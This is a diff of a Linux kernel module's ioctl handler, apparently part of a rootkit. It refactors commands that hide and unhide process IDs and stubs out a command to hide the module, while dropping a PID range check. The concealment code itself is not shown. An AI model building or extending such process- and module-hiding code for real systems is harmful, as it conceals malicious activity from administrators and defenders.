@@ -22,9 +22,7 @@
 #include "types.h"
 #include "device/details/cdev_utils.h"
 #include "device/details/file_ops.h"
-#include "device/details/hash_tbl.h"
 #include "device/details/ioctl_cmd.h"
-#include "proc/proc.h"
 
 long dev_ioctl(struct file* p_file, unsigned int cmd, unsigned long arg)
 {
@@ -63,37 +61,23 @@ long dev_ioctl(struct file* p_file, unsigned int cmd, unsigned long arg)
 
     switch(cmd) {
     case CROC_IOC_RESET:
+        /* @todo    Implement */
         break;
     case CROC_IOC_HIDE_PID:
         retval = __get_user(pid, (pid_t __user*)arg);
         if (retval != 0) {
             return retval;
         }
-        if ((pid >= PID_MAX_LIMIT) || (pid < 0)) {
-            return -ESRCH;  /* No such process */
-        }
-
         p_dev = p_file->private_data;
-        if (hash_tbl_insert(&p_dev->hash_tbl, pid)) {
-            retval = process_hide(pid);
-            if (retval != 0) {
-                hash_tbl_erase(&p_dev->hash_tbl, pid);
-            }
-        }
+        retval = ioc_hide_pid(p_dev, pid);
         break;
     case CROC_IOC_SHOW_PID:
         retval = __get_user(pid, (pid_t __user*)arg);
         if (retval != 0) {
             return retval;
         }
-        if ((pid >= PID_MAX_LIMIT) || (pid < 0)) {
-            return -ESRCH;  /* No such process */
-        }
-
         p_dev = p_file->private_data;
-        if (hash_tbl_erase(&p_dev->hash_tbl, pid)) {
-            retval = process_show(pid);
-        }
+        retval = ioc_show_pid(p_dev, pid);
         break;
     case CROC_IOC_HIDE_MODULE:
         /* @todo    Implement */
